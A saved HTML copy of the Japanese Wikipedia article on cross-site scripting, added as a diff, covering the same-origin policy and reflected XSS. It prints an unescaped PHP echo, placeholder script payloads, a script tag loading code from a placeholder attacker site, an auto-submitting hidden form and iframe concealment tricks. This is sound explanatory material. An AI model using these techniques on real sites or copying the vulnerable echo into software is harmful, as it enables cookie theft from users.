@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+
+<html class="client-nojs" dir="ltr" lang="ja">
+<head>
+<meta charset="utf-8"/>
+<title>クロスサイトスクリプティング - Wikipedia</title><style type="text/css">h1.firstHeading{line-height:1.2} .infobox {     border: 1px solid #aaa; background: #f9f9f9; color: black; margin-bottom: 0.5em; margin-left: 1em; padding: .2em; float: right; clear: right; } .infobox tr { vertical-align: top; } .infobox caption { margin-left: inherit; } .infobox.bordered { border-collapse: collapse; } .infobox.bordered td, .infobox.bordered th { border: 1px solid #aaa; } .infobox.sisterproject { width: 20em; font-size: 70%; } div[role="navigation"]{display:none;} a[class="mw-jump-link"]{display:none;} #content{ font-size: 80%; } </style>
+<script>function init(){for(var a,e,b=[],f=location.search.split("?")[1].split("&"),h=f.length,c=0;c<h;c++)a=f[c].split("="),e=decodeURIComponent(a[0]),b[e]=decodeURIComponent(a[1]);a=[];if("false"===b.infobox){b=document.querySelectorAll("[class^='infobox']");0<b.length&&(a=a.concat(b));b=document.querySelectorAll("[id^='infobox']");0<b.length&&(a=a.concat(b));b=document.querySelectorAll("table");0<b.length&&(a=a.concat(b));for(var d in a)for(var g in a[d])console.log(a[d][g]),a[d][g].style.display="none"}};</script></head>
+<body onLoad="init()" class="mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject mw-editable page-クロスサイトスクリプティング rootpage-クロスサイトスクリプティング skin-vector action-view skin-vector-legacy"><div class="noprint" id="mw-page-base"></div>
+<div class="noprint" id="mw-head-base"></div>
+<div class="mw-body" id="content" role="main">
+<a id="top"></a>
+<div id="siteNotice"></div>
+<div class="mw-indicators">
+</div>
+<h1 class="firstHeading" id="firstHeading">クロスサイトスクリプティング</h1>
+<div class="vector-body" id="bodyContent">
+
+<div id="contentSub"></div>
+<div id="contentSub2"></div>
+<div id="jump-to-nav"></div>
+
+
+<div class="mw-body-content mw-content-ltr" dir="ltr" id="mw-content-text" lang="ja"><div class="mw-parser-output">
+<p><b>クロスサイトスクリプティング</b>（<a href="." id="link_a_1" title="英語">英</a>: <span lang="en">cross site scripting</span>）とは、<a href="." id="link_a_2" title="Webアプリケーション">Webアプリケーション</a>の<a href="." id="link_a_3" title="脆弱性">脆弱性</a><sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-0"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>もしくはそれを利用した攻撃。脆弱性をツリー型に分類する<a href="." id="link_a_4" title="Security Content Automation Protocol">CWE</a>ではこの攻撃を不適切な入力確認(CWE-20)によるインジェクション(CWE-74)のひとつとして分類している(CWE-79)<sup class="reference" id="cite_ref-:0_2-0"><a href="#cite_note-:0-2">[2]</a></sup>。略称は<b>XSS</b>。かつてはCSSという略称も使われていたが、<a href="." id="link_a_5" title="Cascading Style Sheets">Cascading Style Sheets</a>と紛らわしいのでこの略称はあまり使われなくなった<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-1"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。
+</p><p>「クロスサイト（サイト横断）」という名称は歴史的なもので、初期に発見されたXSSでは脆弱性のあるサイトと攻撃者のサイトを「サイト横断的」に利用して攻撃を実行する事から名づけられたものだが<sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-0"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup><sup class="reference" id="cite_ref-4"><a href="#cite_note-4">[4]</a></sup>、XSSの定義は新しいタイプの攻撃が見つかるたびに拡張され、サイト横断的なものでなくともXSSと呼ぶようになった<sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-1"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup>。
+</p><p>この拡張された定義においてXSS攻撃とは、攻撃者の作成したスクリプトを<i>脆弱性のある標的サイトのドメインの権限において</i>閲覧者のブラウザで実行させる攻撃一般を指す<sup class="reference" id="cite_ref-FOOTNOTE金床20073章冒頭部_3-2"><a href="#cite_note-FOOTNOTE金床20073章冒頭部-3">[3]</a></sup>。斜体で書いた部分がXSS攻撃の重要な特徴であり、この特徴により標的サイトの権限がないと実行できないようブラウザが制限している（<a href="." id="link_a_6" title="同一生成元ポリシー">同一生成元ポリシー</a>）はずの行動を、攻撃者に実行可能にしてしまう<sup class="reference" id="cite_ref-FOOTNOTE金床20073章『攻撃の概要』節_5-0"><a href="#cite_note-FOOTNOTE金床20073章『攻撃の概要』節-5">[5]</a></sup>。
+</p>
+<div aria-labelledby="mw-toc-heading" class="toc" id="toc" role="navigation"><input class="toctogglecheckbox" id="toctogglecheckbox" role="button" style="display:none" type="checkbox"/><div class="toctitle" dir="ltr" lang="ja"><h2 id="mw-toc-heading">目次</h2><span class="toctogglespan"><label class="toctogglelabel" for="toctogglecheckbox"></label></span></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="#概要"><span class="tocnumber">1</span> <span class="toctext">概要</span></a>
+<ul>
+<li class="toclevel-2 tocsection-2"><a href="#背景"><span class="tocnumber">1.1</span> <span class="toctext">背景</span></a></li>
+<li class="toclevel-2 tocsection-3"><a href="#XSS攻撃の目的と特徴づけ"><span class="tocnumber">1.2</span> <span class="toctext">XSS攻撃の目的と特徴づけ</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-4"><a href="#XSS脆弱性とXSS攻撃の詳細"><span class="tocnumber">2</span> <span class="toctext">XSS脆弱性とXSS攻撃の詳細</span></a>
+<ul>
+<li class="toclevel-2 tocsection-5"><a href="#インジェクション方法の具体例"><span class="tocnumber">2.1</span> <span class="toctext">インジェクション方法の具体例</span></a>
+<ul>
+<li class="toclevel-3 tocsection-6"><a href="#GETメソッドのみに適用できる方法"><span class="tocnumber">2.1.1</span> <span class="toctext">GETメソッドのみに適用できる方法</span></a></li>
+<li class="toclevel-3 tocsection-7"><a href="#GETメソッド、POSTメソッド双方に適用できる方法"><span class="tocnumber">2.1.2</span> <span class="toctext">GETメソッド、POSTメソッド双方に適用できる方法</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-8"><a href="#隠蔽工作"><span class="tocnumber">2.2</span> <span class="toctext">隠蔽工作</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="#インジェクションする言語"><span class="tocnumber">2.3</span> <span class="toctext">インジェクションする言語</span></a></li>
+<li class="toclevel-2 tocsection-10"><a href="#インジェクション箇所"><span class="tocnumber">2.4</span> <span class="toctext">インジェクション箇所</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-11"><a href="#XSSの被害"><span class="tocnumber">3</span> <span class="toctext">XSSの被害</span></a>
+<ul>
+<li class="toclevel-2 tocsection-12"><a href="#個人情報の奪取"><span class="tocnumber">3.1</span> <span class="toctext">個人情報の奪取</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-13"><a href="#攻撃手法の分類"><span class="tocnumber">4</span> <span class="toctext">攻撃手法の分類</span></a>
+<ul>
+<li class="toclevel-2 tocsection-14"><a href="#反射型XSS"><span class="tocnumber">4.1</span> <span class="toctext">反射型XSS</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="#格納型XSS"><span class="tocnumber">4.2</span> <span class="toctext">格納型XSS</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="#DOMベースXSS"><span class="tocnumber">4.3</span> <span class="toctext">DOMベースXSS</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-17"><a href="#対策"><span class="tocnumber">5</span> <span class="toctext">対策</span></a>
+<ul>
+<li class="toclevel-2 tocsection-18"><a href="#引用符で囲んだ属性値に対するXSS"><span class="tocnumber">5.1</span> <span class="toctext">引用符で囲んだ属性値に対するXSS</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-19"><a href="#脚注"><span class="tocnumber">6</span> <span class="toctext">脚注</span></a></li>
+<li class="toclevel-1 tocsection-20"><a href="#参考文献"><span class="tocnumber">7</span> <span class="toctext">参考文献</span></a></li>
+</ul>
+</div>
+<h2><span id=".E6.A6.82.E8.A6.81"></span><span class="mw-headline" id="概要">概要</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=1" title="節を編集: 概要">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+<h3><span id=".E8.83.8C.E6.99.AF"></span><span class="mw-headline" id="背景">背景</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=2" title="節を編集: 背景">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<div class="rellink" style="margin-bottom: 0.5em; padding-left: 2em; font-style: italic;">詳細は「<a href="/wiki/%E5%90%8C%E4%B8%80%E7%94%9F%E6%88%90%E5%85%83%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC" title="同一生成元ポリシー">同一生成元ポリシー</a>」を参照</div>
+<p>XSSについて述べる前に、ウェブサイトの仕組みについて簡単に復習する。<a href="/wiki/JavaScript" title="JavaScript">JavaScript</a>のような<a href="/wiki/%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%B5%E3%82%A4%E3%83%89" title="クライアントサイド">クライアントサイド</a>の<b>スクリプト</b>は、ウェブサイトが閲覧者が取った行動（例えばフォーム に何を記載したか）を<b>変数</b>の形で取得し、取得した変数値に応じて<b>動的</b>にHTMLを生成する。
+</p><p>セキュリティの観点から見た場合スクリプトには非常に強い権限が与えられている為、これを悪用された場合には大きな危険を伴う事になる。具体的にはスクリプトを使えばブラウザに保管されている<a href="/wiki/HTTP_cookie" title="HTTP cookie">cookie</a>の内容を読み書きする事も可能であるし、ログイン時にはサイトからユーザ固有の情報を読み書きする事も可能である。さらにはそうした情報を別のサイト（例えば攻撃者のサイト）に転送する事も可能である。
+</p><p>こうした事情によりウェブブラウザには<b><a href="/wiki/%E5%90%8C%E4%B8%80%E7%94%9F%E6%88%90%E5%85%83%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC" title="同一生成元ポリシー">同一生成元ポリシー</a></b>という、スクリプトの悪用を制限するためのポリシーが実装されている。このポリシーは、「ウェブページ１に記載されたスクリプトがそれとは別のウェブページ２に関するデータにアクセスできるのは、ページ１と２が同一の「オリジン」にある場合のみである」とするものである。ここでページ１と２の<b>オリジン</b>が同一であるとは、１と２のプロトコル、ホスト名、ポート番号が一致する事を指す。
+</p><p>多くのケースにおいて同一のウェブサイト上にあるページは同一のホスト上において同一のプロトコル(http)と同一ポート番号(80番)で動作するものなので、同一生成元ポリシーはウェブサイトを構築する上であまり邪魔にならない。しかし攻撃者が全く別のサイトからスクリプトによってデータを不正に読み取ろうとしたとしても同一生成元ポリシーがこれを妨げるのでセキュリティは担保される。
+</p>
+<h3><span id="XSS.E6.94.BB.E6.92.83.E3.81.AE.E7.9B.AE.E7.9A.84.E3.81.A8.E7.89.B9.E5.BE.B4.E3.81.A5.E3.81.91"></span><span class="mw-headline" id="XSS攻撃の目的と特徴づけ">XSS攻撃の目的と特徴づけ</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=3" title="節を編集: XSS攻撃の目的と特徴づけ">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>XSS攻撃は、ウェブサイト（<b>標的サイト</b>）の脆弱性(XSS脆弱性)を利用する事で、標的サイトの権限で悪意のあるコンテンツ（多くの場合スクリプト）を実行する事を目的として行われる<sup class="reference" id="cite_ref-FOOTNOTE金床20073章『攻撃の概要』節_5-1"><a href="#cite_note-FOOTNOTE金床20073章『攻撃の概要』節-5">[5]</a></sup><sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-2"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。悪意のあるコンテンツは標的サイトの権限で実行されるので、同一生成元ポリシーによる制限が迂回される<sup class="reference" id="cite_ref-FOOTNOTE金床20073章『攻撃の概要』節_5-2"><a href="#cite_note-FOOTNOTE金床20073章『攻撃の概要』節-5">[5]</a></sup><sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-3"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。これを悪用する事により攻撃者は標的サイトを閲覧したユーザ（＝<b>被害者</b>）のcookieを盗むなど、様々な攻撃を行う。
+</p><p>CWE-79ではXSS攻撃を以下のような攻撃として特徴づけており、XSS脆弱性をXSS攻撃を可能にする脆弱性として特徴づけている<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-4"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。XSS攻撃を行う攻撃者は標的サイトへのデータ入力経路に不正なデータを注入（<b>インジェクション</b>）する。ここでいう「データ入力経路」は正規のユーザのために用意された入力経路（例えばフォーム）の場合もあればそうでない場合もあり、標的サイトのウェブアプリケーションへのWebリクエスト全般が狙われる<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-5"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。また不正なデータはスクリプトなどWebブラウザで実行可能な悪意のあるコンテンツを含んだものが用いられる。
+</p><p>このインジェクションの結果、標的サイトのウェブサーバが攻撃者の用意した不正データを含んだウェブページを動的に生成する<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-6"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。この生成されたウェブページを被害者となるユーザが閲覧すると、不正なデータに含まれる悪意のあるコンテンツが標的サイトの権限により被害者のブラウザ上で実行され、攻撃が成功する<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-7"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup>。
+</p><p>XSS攻撃に用いる「Webブラウザで実行可能なコンテンツ」は何らかのスクリプトである事が多いので、本稿では以下、特に断りがない限りスクリプトのケースについて述べる。
+</p>
+<h2><span id="XSS.E8.84.86.E5.BC.B1.E6.80.A7.E3.81.A8XSS.E6.94.BB.E6.92.83.E3.81.AE.E8.A9.B3.E7.B4.B0"></span><span class="mw-headline" id="XSS脆弱性とXSS攻撃の詳細">XSS脆弱性とXSS攻撃の詳細</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=4" title="節を編集: XSS脆弱性とXSS攻撃の詳細">編集</a><span class="mw-editsection-bracket">]</span></span></h2>
+<p>本節ではXSS脆弱性とXSS攻撃の詳細を具体例を通して述べる。
+すでに述べたように、ウェブサイトではユーザがフォームなどで入力した値を変数として持ち、変数にセットされた値に応じてその後の動的なページ内容の生成が行われ、その際には変数値そのものがページに表示されることもある。XSS脆弱性の簡単な例としては<b>ユーザが値を決定できる変数値を加工せずそのままウェブページに表示（エコーバック）してしまう</b><sup class="reference" id="cite_ref-FOOTNOTEIPA2014_6-0"><a href="#cite_note-FOOTNOTEIPA2014-6">[6]</a></sup>というものがある。具体的には以下のようなシチュエーションでXSS脆弱性が生じる事が多い：
+</p>
+<ul><li>ユーザが入力した内容の確認・訂正させるページ<sup class="reference" id="cite_ref-FOOTNOTEIPA2011_7-0"><a href="#cite_note-FOOTNOTEIPA2011-7">[7]</a></sup></li>
+<li>検索結果の表示<sup class="reference" id="cite_ref-FOOTNOTEIPA2011_7-1"><a href="#cite_note-FOOTNOTEIPA2011-7">[7]</a></sup></li>
+<li>エラー表示<sup class="reference" id="cite_ref-FOOTNOTEIPA2011_7-2"><a href="#cite_note-FOOTNOTEIPA2011-7">[7]</a></sup></li>
+<li>ブログや掲示板におけるコメントの反映<sup class="reference" id="cite_ref-FOOTNOTEIPA2011_7-3"><a href="#cite_note-FOOTNOTEIPA2011-7">[7]</a></sup></li></ul>
+<p>そこで最初に挙げた確認ページのシチュエーションにおける脆弱性を利用したXSS攻撃の例を述べる。今、標的サイト example.comのウェブページにユーザの性別を選択させるフォームがあり、そのページではユーザが選択した値（"man"もしくは"woman"）を変数genderにそのまま保管し、genderの内容を以下のようにそのまま表示する事でフォームの内容をユーザに再確認させるページを動的に生成するとする（再確認ページのURLはフォームのあるページのURLと同一でも異なってもよい）。
+</p><p>&lt;syntaxhighlight lang="html4strict"&gt;
+入力した性別は以下のもので正しいでしょうか：
+</p>
+<pre>（genderの値）
+</pre>
+<p>&lt;/syntaxhighlight&gt;
+</p><p>具体的にはたとえばPHPで
+&lt;syntaxhighlight lang="html"&gt;
+</p>
+<pre>&lt;?php echo "名前：".$_GET['gender'];&gt;
+</pre>
+<p>&lt;/syntaxhighlight&gt;
+もしくは
+&lt;syntaxhighlight lang="html"&gt;
+</p>
+<pre>&lt;?php echo "名前：".$_POST['gender'];&gt;
+</pre>
+<p>&lt;/syntaxhighlight&gt;
+というスクリプトが書かれていた場合である。
+</p><p>このようなページにおいて、攻撃者が何らかの方法でgenderの値を
+</p>
+<pre>gender=<span style="color:red">&lt;script&gt;（悪意のあるスクリプト）&lt;/script&gt;</span>
+</pre>
+<p>にセット（＝スクリプトのインジェクション。 詳細後述）し、この状態で被害者となるユーザがこのページにアクセスしてしまうとXSS攻撃は成功となる。
+</p><p>実際、標的サイトのウェブページには、変数genderの値をそのまま表示するページを動的に生成してしまうという脆弱性があるので、攻撃者が前述のようにgenderをセットした状態で被害者となるユーザがこのページを閲覧してしまうと、ウェブサイトは動的に生成したHTML
+</p>
+<pre>入力した性別は以下のもので正しいでしょうか：
+<span style="color:red">&lt;script&gt;（悪意のあるスクリプト）&lt;/script&gt;</span>
+</pre>
+<p>を被害者のブラウザに送りつけてくるため、悪意のあるスクリプトが被害者のブラウザ上で自動的に実行されてしまう。
+</p><p>なお、ウェブサイトの作者がgenderの値としてフォームに準備した値が「man」と「woman」の２つだけだったとしても、実際にgenderにセットされた値が「man」か「woman」のいずれかであることを、ウェブサイトを置いているサーバ側でチェックしない限り、攻撃者はそれ以外の値（＝悪意のあるスクリプト）にgenderをセット可能である。
+</p>
+<h3><span id=".E3.82.A4.E3.83.B3.E3.82.B8.E3.82.A7.E3.82.AF.E3.82.B7.E3.83.A7.E3.83.B3.E6.96.B9.E6.B3.95.E3.81.AE.E5.85.B7.E4.BD.93.E4.BE.8B"></span><span class="mw-headline" id="インジェクション方法の具体例">インジェクション方法の具体例</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=5" title="節を編集: インジェクション方法の具体例">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>次に攻撃者が悪意のあるスクリプトをインジェクションする方法を述べる。方法はウェブページにどのようなXSS脆弱性が存在するのかに依存するので、ここではフォームの入力値の２通りの送信方法(GETメソッド、POSTメソッド)に応じてインジェクション方法を２通り述べる。
+</p><p>なお、ここで説明する例はいずれも、後述するXSSの分類では「反射型」に属する。
+</p>
+<h4><span id="GET.E3.83.A1.E3.82.BD.E3.83.83.E3.83.89.E3.81.AE.E3.81.BF.E3.81.AB.E9.81.A9.E7.94.A8.E3.81.A7.E3.81.8D.E3.82.8B.E6.96.B9.E6.B3.95"></span><span class="mw-headline" id="GETメソッドのみに適用できる方法">GETメソッドのみに適用できる方法</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=6" title="節を編集: GETメソッドのみに適用できる方法">編集</a><span class="mw-editsection-bracket">]</span></span></h4>
+<p>GETメソッドでは変数の値がURLに明記されるので、フォームの内容をユーザに再確認させるページのURLは
+</p>
+<pre>http://example.com/?gender=（フォームで入力した値）
+</pre>
+<p>のような形になっている。
+</p><p>そこで攻撃者は被害者となるユーザに以下のURLにアクセスするよう何らかの方法（たとえばexample.comを装った罠メールにこのURLを記載）で促す：
+</p>
+<pre>http://example.com/?gender=<span style="color:red">&lt;script&gt;（悪意のあるスクリプト）&lt;/script&gt;</span>
+</pre>
+<p>するとgenderが悪意のあるスクリプトにセットされたページを被害者が閲覧することになるので、攻撃が成功したことになる。
+</p><p>ここで重要なのは、上記のURLが「http://example.com/」から始まる事である。これが原因でユーザはexample.comの何ら問題のないWebページだと誤解してしまい、上記のURLをクリックしてしまう可能性がある。
+</p><p>なお、ここでは悪意のあるスクリプトを標的サイトのURLに埋め込む方法を紹介したが、URLの長さには上限がある関係上、埋め込めるスクリプトの長さが制限されてしまうため、攻撃者が行える攻撃の種類が制限されてしまう。
+</p><p>長さに制限のないスクリプトを埋め込むには、攻撃者は自分のサイトを立ち上げ、そこに悪意のあるスクリプト「http://（攻撃者のサイト上の悪意のあるスクリプト）」をおいた上で、被害者に
+</p>
+<pre>http://example.com/?gender=<span style="color:red">&lt;script src="http://（攻撃者のサイト上の悪意のあるスクリプト名）"&gt;&lt;/script&gt;</span>
+</pre>
+<p>を閲覧させればよい。
+</p><p>ただしこちらの攻撃の場合、攻撃者のサイトのURLがウェブサーバのログに残るため、これを手がかりにサーバ管理者が攻撃者を特定できる可能性がある。したがって攻撃者は自身のサイトの場所を頻繁に変えるなど追跡の手を逃れる手段を講じる必要がある。
+</p>
+<h4><span id="GET.E3.83.A1.E3.82.BD.E3.83.83.E3.83.89.E3.80.81POST.E3.83.A1.E3.82.BD.E3.83.83.E3.83.89.E5.8F.8C.E6.96.B9.E3.81.AB.E9.81.A9.E7.94.A8.E3.81.A7.E3.81.8D.E3.82.8B.E6.96.B9.E6.B3.95"></span><span class="mw-headline" id="GETメソッド、POSTメソッド双方に適用できる方法">GETメソッド、POSTメソッド双方に適用できる方法</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=7" title="節を編集: GETメソッド、POSTメソッド双方に適用できる方法">編集</a><span class="mw-editsection-bracket">]</span></span></h4>
+<p>上述したGETメソッドの例ではURLに変数の値がそのまま表示されている事が攻撃者にXSS攻撃を可能にしてしまった原因の一つである。しかしURLに変数の値が表示されないPOSTメソッドを使った場合でもXSS攻撃が可能である。以下、POSTメソッドを前提にして話をすすめるが、GETメソッドに対しても同様の方法でインジェクションが可能である。
+</p><p>標的サイトにXSS攻撃を仕掛けるため、攻撃者は自身でウェブサイト（<b>罠サイト</b>）を立ち上げ、そこに以下のようなHTMLを書く：
+</p>
+<pre> &lt;form action="<span style="color:blue">http:</span><span style="color:blue">//example.com/</span>" method="POST" name ="<span style="color:green">hoge</span>"&gt;
+ &lt;input <span style="color:red">type="hidden" name="gender" value='&lt;script&gt;（悪意のあるスクリプト）&lt;/script&gt;'</span>&gt;
+&lt;/form&gt;
+&lt;script&gt;document.<span style="color:green">hoge</span>.submit()&lt;/script&gt;
+</pre>
+<p>被害者が罠サイトを表示してしまうと、フォームhogeのinput文においてgenderが（悪意のあるスクリプト）にセットされた状態で標的サイト「http://example.com/」が表示されてしまうので、被害者のブラウザで悪意のあるスクリプトが実行されてしまう。
+</p><p>しかもこのinput文はhidden指定なのでgenderの値は被害者のブラウザ上に表示されず、被害者はこの事実に気づかない。
+</p>
+<h3><span id=".E9.9A.A0.E8.94.BD.E5.B7.A5.E4.BD.9C"></span><span class="mw-headline" id="隠蔽工作">隠蔽工作</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=8" title="節を編集: 隠蔽工作">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>上で説明した「GETメソッドのみに適用できる例」ではユーザがアクセスした攻撃用サイトには「入力した性別は以下のもので正しいでしょうか」といった文章が表示されてしまうため、攻撃を受けたことにユーザが気づいてしまう可能性があるが、攻撃者が悪意のあるスクリプト部分の冒頭に&lt;syntaxhighlight lang="javascript"&gt;
+document.body.innerHTML=""
+&lt;/syntaxhighlight&gt;という<a href="/wiki/JavaScript" title="JavaScript">JavaScript</a>を記載しておけば、HTML本文が完全消去されるため、上述のような不自然な文章は表示されない。
+</p><p>これに続けて（JavaScriptのdocument.writeメソッドを使って）攻撃に必要な内容をスクリプト部分に自由に記述可能となる。
+</p><p>別の隠蔽工作方法として、罠サイトでHTMLのiframeタグと<a href="/wiki/Cascading_Style_Sheets" title="Cascading Style Sheets">CSS</a>を用いるというものがあり、この方法には攻撃者にとって上で述べた隠蔽工作とは違った利点がある（詳細後述）。なおiframeとはウェブページを入れ子にするためのHTMLタグで、ウェブページA上にウェブページBのURLを指定したiframeタグを書くと、A上に四角いフレームができ、その中にBの内容が表示される。これを利用して攻撃者は以下のように隠蔽工作を図る。
+</p><p>まず攻撃者は罠サイトのページAにiframeタグを書くことで、悪意のあるスクリプトを埋め込んだ標的サイトのURLを読む込む。具体的には、ページAに
+</p>
+<pre>&lt;iframe src=http://example.com/?gender=<span style="color:red">&lt;script&gt;（悪意のあるスクリプト）&lt;/script&gt;</span>&gt;&lt;/iframe&gt;
+</pre>
+<p>と記載する<sup class="reference" id="cite_ref-FOOTNOTE金床2007第三章「攻撃の概要」節_8-0"><a href="#cite_note-FOOTNOTE金床2007第三章「攻撃の概要」節-8">[8]</a></sup><sup class="reference" id="cite_ref-FOOTNOTE徳丸201191_9-0"><a href="#cite_note-FOOTNOTE徳丸201191-9">[9]</a></sup>。
+</p><p>さらにCSSを書くことでiframeの内容が表示されたフレームがAの閲覧者には見えないようにする<sup class="reference" id="cite_ref-FOOTNOTE徳丸201191_9-1"><a href="#cite_note-FOOTNOTE徳丸201191-9">[9]</a></sup>。この状態で被害者を誘導してページAを開かせると、iframeにより自動的に悪意のあるスクリプトを埋め込んだ標的サイトが読み込まれるので、攻撃が成功する。
+</p><p>この隠蔽工作の利点は、攻撃に用いたiframeはCSSで隠しているので、<b>標的サイトと全く無関係に見える罠サイトを被害者が開いただけで攻撃が完了</b>し、しかも<b>罠サイトのURLにも不自然なところはない</b>ので、被害者にとって罠サイトと通常サイトを見分ける手段が無いことである。
+</p><p>「GETメソッド、POSTメソッド双方に適用できる方法」に対しても同様にiframeとCSSで隠蔽工作が可能である。こちらの場合、攻撃用のフォームを書いたページBを罠サイトに作成し、BをiframeでページAに読み込んだ上でCSSによりiframeを隠せばよい。
+</p><p>被害者がページAを閲覧すると、iframe内は悪意のあるスクリプトを埋め込んだ標的サイトに遷移するという不自然な動きをするが、CSSでiframeを隠しているので被害者はこのことに気づかない。
+</p><p><br/>
+</p>
+<h3><span id=".E3.82.A4.E3.83.B3.E3.82.B8.E3.82.A7.E3.82.AF.E3.82.B7.E3.83.A7.E3.83.B3.E3.81.99.E3.82.8B.E8.A8.80.E8.AA.9E"></span><span class="mw-headline" id="インジェクションする言語">インジェクションする言語</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;section=9" title="節を編集: インジェクションする言語">編集</a><span class="mw-editsection-bracket">]</span></span></h3>
+<p>XSS攻撃に用いる「Webブラウザで実行可能なコンテンツ」の例として、CWE-79では以下のものを挙げている：
+</p>
+<ul><li>JavaScript<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-8"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>HTML タグ<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-9"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>HTML アトリビュート<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-10"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>マウスイベント<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-11"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>Flash<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-12"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li>
+<li>ActiveX<sup class="reference" id="cite_ref-FOOTNOTECWE-792011_1-13"><a href="#cite_note-FOOTNOTECWE-792011-1">[1]</a></sup></li></ul>
